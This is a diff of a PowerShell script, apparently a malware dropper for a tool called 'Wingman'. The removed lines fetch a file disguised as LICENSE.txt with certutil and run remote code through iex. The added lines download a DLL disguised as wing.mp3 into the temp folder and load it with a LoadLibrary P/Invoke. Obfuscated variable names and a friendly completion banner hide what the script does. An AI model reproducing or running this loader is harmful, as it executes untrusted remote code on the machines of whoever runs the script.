@@ -1,13 +1,23 @@
-$MhsL4kfzoVFu="https://github.com/eforentropy/Wingman/raw/refs/heads/main/LICENSE.txt"
-$HIQYuZEdcXhlrt = "LICENSE.txt"
-$vdIDy = [System.IO.Path]::GetTempPath()
-$hcNQBmuFUySIJdTKrnjAG = Join-Path -Path $vdIDy -ChildPath $HIQYuZEdcXhlrt
-certutil -urlcache -split -f $MhsL4kfzoVFu $hcNQBmuFUySIJdTKrnjAG
-iex (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/eforentropy/Wingman/refs/heads/main/wingman2" -UseBasicParsing).Content
+$f = $env:TEMP+"\wing.mp3"
+$u='https://github.com/eforentropy/Wingman/raw/refs/heads/main/wing.mp3';  $i=[System.Net.WebRequest]::Create($u); $i.Method='GET'; $r=$i.GetResponse(); $s=$r.GetResponseStream(); $b=New-Object System.IO.MemoryStream; $s.CopyTo($b); [System.IO.File]::WriteAllBytes($f,$b.ToArray()); $b.Close(); $r.Close()
+$CdGr= @"
+using System;
+using System.Runtime.InteropServices;
+public class Load
+{
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr LoadLibrary(string dllToLoad);
+}
+"@
+Add-Type $CdGr
+$xzSmUwcL4oZI=[Load]::LoadLibrary($f)
 
 
-
-
-
-
+if ($xzSmUwcL4oZI -eq [IntPtr]::Zero) {
+    Write-Host "[!] Unexpected Behavior. Wingman Returned Zero. Terminal Not Safe for Invoking" -ForegroundColor Red
+} else {
+	Write-Host "==============================" -ForegroundColor Cyan
+	Write-Host "        Wingman Completed     " -ForegroundColor Green
+	Write-Host "==============================" -ForegroundColor Cyan
+}
 
